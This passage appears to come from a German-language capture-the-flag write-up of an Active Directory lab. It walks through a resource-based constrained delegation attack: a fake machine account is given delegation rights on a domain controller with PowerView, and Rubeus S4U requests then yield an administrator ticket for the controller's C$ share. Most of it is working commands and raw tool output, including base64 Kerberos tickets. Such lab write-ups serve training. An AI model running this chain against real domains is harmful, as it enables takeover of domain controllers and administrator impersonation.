objectclass            : {top, person, organizationalPerson, user...}
name                   : FAKE01
objectsid              : S-1-5-21-775547830-308377188-957446042-9101
samaccountname         : FAKE01$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 1/18/2023 3:58:55 PM
instancetype           : 4
usncreated             : 123109
objectguid             : 69b80dae-ac66-4dbb-a2ed-c335ad4a6d81
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=megaairline,DC=local
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : {RestrictedKrbHost/FAKE01, HOST/FAKE01, RestrictedKrbHost/FAKE01.megaairline.local, HOST/FAKE01.megaairline.local}
ms-ds-creatorsid       : {1, 5, 0, 0...}
badpwdcount            : 0
cn                     : FAKE01
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 1/18/2023 3:58:55 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 123111
dnshostname            : FAKE01.megaairline.local


PS C:\Users\elliot\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-775547830-308377188-957446042-9101)"
PS C:\Users\elliot\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\Users\elliot\Documents> $SD.GetBinaryForm($SDBytes, 0)
PS C:\Users\elliot\Documents> Get-DomainComputer DC2 -Server dc2.megaairline.local | Set-DomainObject -Server dc2.megaairline.local -Domain megaairline.local -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://dc2.megaairline.local/DC=megaairline,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC2,OU=Domain Controllers,DC=megaairline,DC=local)))
VERBOSE: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36
 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 182 235 57 46 100 118 97 18 154 119 17 57 141 35 0 0' for object 'DC2$'
PS C:\Users\elliot\Documents> Get-DomainComputer DC2 -Server dc2.megaairline.local  | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

name msds-allowedtoactonbehalfofotheridentity
---- ----------------------------------------
DC2  {1, 0, 4, 128...}


PS C:\Users\elliot\Documents> (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $SDBytes, 0).DiscretionaryAcl


BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-775547830-308377188-957446042-9101
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None

PS C:\Users\elliot\Documents> .\Rubeus.exe hash /password:123456 /user:fake01 /domain:megaairline.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : fake01
[*] Input domain               : megaairline.local
[*] Salt                       : MEGAAIRLINE.LOCALfake01
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 825B505516C1640C1CA6FEC1514CB1B4
[*]       aes256_cts_hmac_sha1 : 4532A8D8F82711660D2FE12766E65C381A92938FC60FD614E0703F1152CE4CAD
[*]       des_cbc_md5          : 255BE5A7E94A91F7
```

Das hat nun wunderbar geklappt. Ich versuche nun wieder mit Rubeus mir ein Ticket für Administrator zu bekommen

```
PS C:\Users\elliot\Documents> .\Rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:CIFS/DC2.megaairline.local /ptt /nowrap /domain:megaairline.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2

[*] Action: S4U

[*] Using rc4_hmac hash: 32ED87BDB5FDC5E9CBA88547376818D4
[*] Building AS-REQ (w/ preauth) for: 'megaairline.local\fake01$'
[*] Using domain controller: 192.168.11.201:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFHjCCBRqgAwIBBaEDAgEWooIEJTCCBCFhggQdMIIEGaADAgEFoRMbEU1FR0FBSVJMSU5FLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFtZWdhYWlybGluZS5sb2NhbKOCA9MwggPPoAMCARKhAwIBAqKCA8EEggO9ue4/L920S4bX/XKGam3vb8As6rZrhmXtlPRCkJ+TWgxs4RXIPXDHvnonoTIchdBHFFBW45xPKog6rbMbab2Qmio1Xtsh/37IYqpAn3H6huvbPYCIH4XLE8CmrLU3eD+xNvMFtwlJob8NtjfhdknXb7cl/kutHFcZjR2dFD7sYR49ap9JIzGqAb79j0F0o6Iv26LYSGmjJEmjIFZKXRBcJ/4ivC5vIhnogbY6kS2F8M/7CF9iSGlpzAbNhtYynVqT0NS+L3lBI9fHnaxhFJzMHtqLmoNslpVy/clU8s/dj1dr4VdcgbVGdvalypSg3oJ4b6Vxpyi382+8nJ95QcWpZuBCegAZwZUi5lYUDk0d2QbNkQXBRHHUCq4oZjIUcq8c0Knt42QoyBZGqd0ClCrtI+Wfz3tW2c3unaxdH/DjbW1gtg1qQz29bs0cp3Hneq5PcoUqiGO75wdQpJyA39AliK9qXfCYaPed9Tvd+EHdvAnxmwuKUNlibtb0G0/kz76iPLZfSAmTQgTxf4C7BbeqrOivUycJ4GHI7b8LquuXNlFyNsjigpla0NNG3lM64UfppGAww3ky0E3uZMZdigHMSTrPB48QI0a8doSoKE4J3EUzYZKXL9Kla520q28rvEid87XSu5FfkT+ChLkuqv0r7rVz9D9Kg1RbMvnBCEFXrT48jI3dOu1xjWZkT0ppuoD+REpqW51KCaaeMxUXtFd2iTiJ3YwH0zCP6QTDq+apR1yhXwlId2KObAEyzM+KVoks7xYhr7Z1TQtlko5ep9vrhMf5gK3k3by1xHm8uPTEZg340wVXoclIRMVyJJEnl6CzSbxEwwrG0aq4FHeqExLJ0W4TZNgYaEcxmOCm5b8XguY3HrwNVs664Epgavju7lR3Yh4sNmLFzrRaRY8PbfTJD1ssoAp6EwD8mIB55dpr1PHzqXyId5UcuJY7B8AC83W4ralHhCyHnnXCEQ3/BvBadH8TX2IqNxSffhU3UJDBrY+2VG/YkC8WFUinjhgM14cpyXBJMUUMhAG1pC2C5BESt7a9G0IVqVfrvUjYrdtIZ2GCcenhb29sxPa7Sz77zm8d6QxrWzutI7nVUSE45CTIND+VlpOKhSxNY70NpdmM0rmEnxhPUpk542VbZ+/MDH6H+UOilTCLolGOKIXXIyHOqYdLYQr53MMsfF9qjQbbhY+8ZiUVTRtNDyB+epg77OPv74aYU88RXYcHNjkaypm4khiB9lBQBbg9i/u0VEqJVsJevF82NDeUJo4EIR7io4HkMIHhoAMCAQCigdkEgdZ9gdMwgdCggc0wgcowgcegGzAZoAMCARehEgQQD58JVXZUgoaZzmLi9kO+YKETGxFNRUdBQUlSTElORS5MT0NBTKIUMBKgAwIBAaELMAkbB2Zha2UwMSSjBwMFAEDhAAClERgPMjAyMzAxMTgyMTM1NTBaphEYDzIwMjMwMTE5MDczNTUwWqcRGA8yMDIzMDEyNTIxMzU1MFqoExsRTUVHQUFJUkxJTkUuTE9DQUypJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEW1lZ2FhaXJsaW5lLmxvY2Fs


[*] Action: S4U

[*] Building S4U2self request for: 'fake01$@MEGAAIRLINE.LOCAL'
[*] Using domain controller: DC2.megaairline.local (192.168.11.201)
[*] Sending S4U2self request to 192.168.11.201:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'fake01$@MEGAAIRLINE.LOCAL'
[*] base64(ticket.kirbi):

      doIFdDCCBXCgAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoRMbEU1FR0FBSVJMSU5FLkxPQ0FMohQwEqADAgEBoQswCRsHZmFrZTAxJKOCBFowggRWoAMCARehAwIBAaKCBEgEggRECr5FgkqxRN5MzM2Duf2jQiem391wYCp391IRaF5fZYfXgfRlijR1Hn0DY28gx8zpfCeYKiw3pOD6L7GoIblJ5UNLqHHS1Iic517+R38sw63Fn7lsTKFM8cBHqdCrpEdeqnS+31ilqyO5CGTFEOBPvbWbA3eW/oRuOdUbW+H6RlYCMr+812nMc9Ch5xp//igEnwxXvuLFaKOnbkGqhd/FIs3N2CB9cr22FBhRiVjbeNj53BLFPdLX8Q1MQwwhRCesOMeLVIssiUVB+ponv4DeVlLK9tizUcg4fU5UB1kL/mjJDzTO8VZjXj65dsaLVWqBYH9zW9c2BZP5eTF2U5CDFo0Rq/ujdAxTDRvayb+2N5xxIhvfh2hkXNN+G73sECAwbYoskrbUL+Ox2l8UQ0rqlz+rGI83RCuwFTd7nNFH9LNnpUqsAu4SpG7yr69u0hdDdVR6O9R8/G8N0fXVI7lPeypHbi5ldSCLH8ks8wxXc3CJzR2F7JdY6/mVCokHi1ejkti4HZ6EkbfolwJROjIOv3LD3q7i28vWP33XdtSBVWMG0c+YuQX0YBKuqRArTKsG8BHQd5gWuIfRBIXDv7L8ccdP7p0H2NKODNYn9rlFU/B+cPV7Un+BwCk74LSMkAxGABeKLZAcCGuBTYK6oH7WPBG0B3Qsx+EQDrQ62ixJ+LSA9Ey7mMJM9bZbD6c46Gbhq+RbMyowj+Ki3uuiz1T9s+vonHSiZwd4XMPaQHXldpNVGJh5JM6nmT09PMKqyDUptrP/L/x0dL7RB3JFaI3BqjkHlFVWwzeLoo+wjMaiHZBIHtvUMT/TGdKdIKUZY6aM0Ie6BEYopZkpgdcnltBF2EMeCGDtI3InLFjeP06+HGLjuL8s1G+JuaTeB725suASnzJxlwR3knbAW216Ht67fXrpzKXEPTxyxYIRm91MqRWxsY5nZvzIakkQt8RAXfM++9YT+qWUhjsDoQbcoJ16MPxm2SBpqOe+7FnNycChTR50qf+dtnsLK1ZGCljHTobeiwLP3VMH1wAdGcKTlIlquAT0jIBS+succc4ndN1kgEdOL1KY+NJkG6I2nNEAENKs7ZtZEDooBJS7+mlG2Cvfo3x/NwGTxHRTda9K2xe780YWyK1inTtGjYpe9nWbbpL/UgyNaDnOCZmFFYL4P89cXhHp+fpei9XCT9b9qZHDP+WSJN09ZwUgoupETcp8ugoX4tQ2/Xi3MTLcQgo3H8ygGQAs59Cs5i9rL13cPiGIIoBYULAv+DytweSxmjtwMKKmxfkLVvT2lxvnlxOzj8FkbWK9dk5MiioXwj3+gvONgJmCDWUfBzSkoPF7Iq5Nw3MEK16LQFBkLZInCuMPIq1/37jfvA0fNksSbWpIsDe6/L7OgWOVrfFEtEFbRAozndEgSCUniI7i6AGa1MU9x+iBNELtw/3nSo0H3uF89+LtPMjXHN6No4HFMIHCoAMCAQCigboEgbd9gbQwgbGgga4wgaswgaigGzAZoAMCARehEgQQAJXXDg7ihAh7fvbJwjgPrKETGxFNRUdBQUlSTElORS5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEAhAAClERgPMjAyMzAxMTgyMTM1NTBaphEYDzIwMjMwMTE5MDczNTUwWqgTGxFNRUdBQUlSTElORS5MT0NBTKkUMBKgAwIBAaELMAkbB2Zha2UwMSQ=

[*] Impersonating user 'administrator' to target SPN 'CIFS/DC2.megaairline.local'
[*] Building S4U2proxy request for service: 'CIFS/DC2.megaairline.local'
[*] Using domain controller: DC2.megaairline.local (192.168.11.201)
[*] Sending S4U2proxy request to domain controller 192.168.11.201:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/DC2.megaairline.local':

      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
[+] Ticket successfully imported!
```

Schauen ob das Ticket richtig importiert wurde

![Bild](/assets/Bilder/Endgame_Ascension/Pasted%20image%2020230118220040.png){: width="700" height="400" }

Versuchen wir unser Glück ob es klappt

```
PS C:\Users\elliot\Documents> cd \\dc2.megaairline.local\c$
PS Microsoft.PowerShell.Core\FileSystem::\\dc2.megaairline.local\c$> dir


    Directory: \\dc2.megaairline.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/10/2020   6:48 AM                PerfLogs
d-r---       12/21/2020   1:07 PM                Program Files
d-----        9/15/2018  12:21 AM                Program Files (x86)
d-r---        4/29/2020  11:20 AM                Users
d-----         6/9/2021   5:23 AM                Windows


PS Microsoft.PowerShell.Core\FileSystem::\\dc2.megaairline.local\c$> cd users
PS Microsoft.PowerShell.Core\FileSystem::\\dc2.megaairline.local\c$\Users> cd administrator
PS Microsoft.PowerShell.Core\FileSystem::\\dc2.megaairline.local\c$\Users\Administrator> cd Desktop
PS Microsoft.PowerShell.Core\FileSystem::\\dc2.megaairline.local\c$\Users\Administrator\Desktop> dir


    Directory: \\dc2.megaairline.local\c$\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/14/2020  10:45 AM             27 flag.txt


PS Microsoft.PowerShell.Core\FileSystem::\\dc2.megaairline.local\c$\Users\Administrator\Desktop> type flag.txt
PS Microsoft.PowerShell.Core\FileSystem::\\dc2.megaairline.local\c$\Users\Administrator\Desktop>
```

Flag 7
